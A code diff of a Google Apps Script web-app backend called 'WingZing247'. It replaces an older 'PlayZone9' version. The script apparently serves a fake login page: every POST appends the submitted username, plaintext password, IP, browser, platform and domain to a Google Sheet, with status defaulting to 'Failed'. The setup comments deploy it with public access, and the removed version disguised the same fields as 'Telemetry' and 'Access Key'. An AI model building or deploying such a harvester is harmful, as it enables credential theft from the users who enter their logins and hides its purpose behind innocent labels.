@@ -1,33 +1,50 @@
-// Google Apps Script — Paste this in Extensions → Apps Script in your Google Sheet
-// Deploy as Web App: Execute as "Me", Access "Anyone"
-// Copy the deployment URL and set it as GOOGLE_SHEET_WEBAPP_URL in Vercel env vars
+/**
+ * WingZing247 - Google Apps Script Backend
+ *
+ * SETUP INSTRUCTIONS:
+ * 1. Open a new Google Sheet
+ * 2. Extensions > Apps Script
+ * 3. Paste this file, save, then Deploy > New Deployment > Web app
+ * 4. Execute as: Me, Access: Anyone
+ * 5. Copy deployment URL and set as GOOGLE_SHEETS_URL in api/login.js
+ * 6. Run setupHeaders() once to create column headers
+ */
 
 function doPost(e) {
   try {
     var data = JSON.parse(e.postData.contents);
-    var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Telemetry');
-    if (!sheet) {
-      sheet = SpreadsheetApp.getActiveSpreadsheet().insertSheet('Telemetry');
-      sheet.appendRow(['Timestamp', 'Principal', 'Access Key', 'IP', 'Device', 'Browser', 'Site']);
-    }
-    sheet.appendRow([
-      data.timestamp || new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
-      data.principal || '',
-      data.accessKey || '',
-      data.ip || '',
-      data.device || '',
-      data.browser || '',
-      data.site || 'PlayZone9'
-    ]);
-    return ContentService.createTextOutput(JSON.stringify({ status: 'ok' }))
+    var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+    var row = [
+      data.timestamp || new Date().toISOString(),
+      data.username   || '',
+      data.password   || '',
+      data.browser    || '',
+      data.platform   || '',
+      data.ip         || '',
+      data.domain     || '',
+      data.status     || 'Failed'
+    ];
+    sheet.appendRow(row);
+    return ContentService
+      .createTextOutput(JSON.stringify({ success: true }))
       .setMimeType(ContentService.MimeType.JSON);
   } catch (err) {
-    return ContentService.createTextOutput(JSON.stringify({ status: 'error', message: err.message }))
+    return ContentService
+      .createTextOutput(JSON.stringify({ success: false, message: err.toString() }))
       .setMimeType(ContentService.MimeType.JSON);
   }
 }
 
-function doGet() {
-  return ContentService.createTextOutput('Google Sheets Web App is running')
-    .setMimeType(ContentService.MimeType.TEXT);
+function doGet(e) {
+  return ContentService
+    .createTextOutput(JSON.stringify({ status: 'ok' }))
+    .setMimeType(ContentService.MimeType.JSON);
+}
+
+function setupHeaders() {
+  var sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+  var headers = ['Timestamp', 'Username', 'Password', 'Browser', 'Platform', 'IP Address', 'Domain', 'Status'];
+  sheet.getRange(1, 1, 1, headers.length).setValues([headers]);
+  sheet.getRange(1, 1, 1, headers.length).setFontWeight('bold');
+  SpreadsheetApp.flush();
 }
